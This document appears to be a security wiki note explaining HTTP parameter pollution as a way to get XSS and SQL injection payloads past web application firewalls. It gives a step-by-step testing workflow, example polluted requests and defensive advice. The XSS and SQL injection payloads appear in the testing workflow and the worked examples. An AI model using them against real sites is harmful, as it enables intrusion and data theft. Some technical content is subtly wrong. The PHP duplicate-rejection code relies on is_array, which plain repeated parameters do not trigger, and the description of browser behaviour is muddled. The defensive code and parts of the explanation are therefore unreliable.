#webapplications

HTTP parameter pollution (HPP) exploits the fact that different layers (browser, proxy, WAF, application) handle multiple parameters with the same name differently. When you send the same parameter twice, each layer may pick a different one — allowing you to bypass WAF rules while the application still processes your injected value.

## How it works

**Normal request:**
```
GET /search?q=innocent HTTP/1.1
```

**Polluted request (same parameter twice):**
```
GET /search?q=innocent&q=<script>alert(1)</script> HTTP/1.1
```

**What happens:**
- **WAF** inspects and sees: `q=innocent` (first or only)
- **Browser** submits: `q=<script>` (last one)
- **Application** receives: `<script>` (implementation-dependent)

Result: WAF allows it, application processes the injected payload.

## Why different layers disagree

| Layer | Behavior on duplicate params |
| --- | --- |
| **Browser URL bar** | Uses the last value |
| **URL-encoded form** | Depends on framework (see below) |
| **Query string parser** | Depends on language/framework |
| **WAF** | Often uses first, sometimes all, depends on configuration |
| **Load balancer** | May strip duplicates or keep first |

### Language/framework differences

```python
# PHP $_GET['q'] = last value
# Python request.args.get('q') = first value
# Java request.getParameter('q') = first value
# ASP.NET Request["q"] = last value (when using dictionary syntax)
# Node.js req.query.q = array (all values)
```

## Testing workflow

### Step 1: Identify the target

Any parameter that's inspected by a WAF but processed by the application:
- Search fields
- Sorting parameters
- API endpoints
- Cookie-based sessions

### Step 2: Craft a polluted request

Duplicate the parameter, keeping the first benign and the second malicious:

```http
GET /search?q=books&q=<img src=x onerror="alert(1)"> HTTP/1.1
```

or as POST:

```http
POST /api/search HTTP/1.1
Content-Type: application/x-www-form-urlencoded

q=books&q=<img src=x onerror="alert(1)">
```

### Step 3: Verify the bypass

- WAF allows the request (sees first `q=books`)
- Application processes second `q=<img...>` (depending on language)
- XSS payload executes

### Step 4: Test what the application actually processes

Send benign payloads with both values:

```
?q=FIRST&q=SECOND
```

Check the response to see which one appears. Repeat with the malicious variant.

## Real-world examples

### SQLi bypass via HPP

**Normal:**
```
GET /products?id=1' OR '1'='1 HTTP/1.1
→ WAF blocks (sees SQL injection)
```

**Polluted:**
```
GET /products?id=1&id=' OR '1'='1 HTTP/1.1
→ WAF sees: id=1 (benign, allowed)
→ App processes: id=' OR '1'='1 (all records returned)
```

### XSS bypass via HPP

**Normal:**
```
?search=<script>alert(1)</script>
→ WAF blocks
```

**Polluted:**
```
?search=puppies&search=<script>alert(1)</script>
→ WAF sees: search=puppies (allowed)
→ App processes: search=<script> (injected)
```

## Defenses

1. **Validate at the WAF level:** WAF should reject requests with duplicate critical parameters entirely, not just check the first one

2. **Standardize parameter handling:** Application should validate/sanitize *every* instance of a parameter, not just the first/last

3. **Explicit allowlists:** For parameters used in security decisions (sort, filter), only accept known values from a fixed set

4. **Normalize input:** Strip duplicate parameters on the front-end or load balancer level

**Example remediation (PHP):**
```php
// UNSAFE — uses last value without validation
$search = $_GET['q'];

// SAFER — validate and use only first value
$search = isset($_GET['q']) ? $_GET['q'] : '';
if (is_array($search)) $search = $search[0];  // Take only first if duplicated
sanitize($search);
```

**Better — reject requests with duplicates:**
```php
if (isset($_GET['q']) && is_array($_GET['q'])) {
    http_response_code(400);
    exit('Invalid request');
}
```

---

**See also:**
- OWASP: [Testing for HTTP Parameter Pollution](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution)
- [[WAF Bypasses]] — other WAF evasion techniques
- [[Cross-Site Scripting]], [[SQL Injection]] — payloads commonly bypassed via HPP
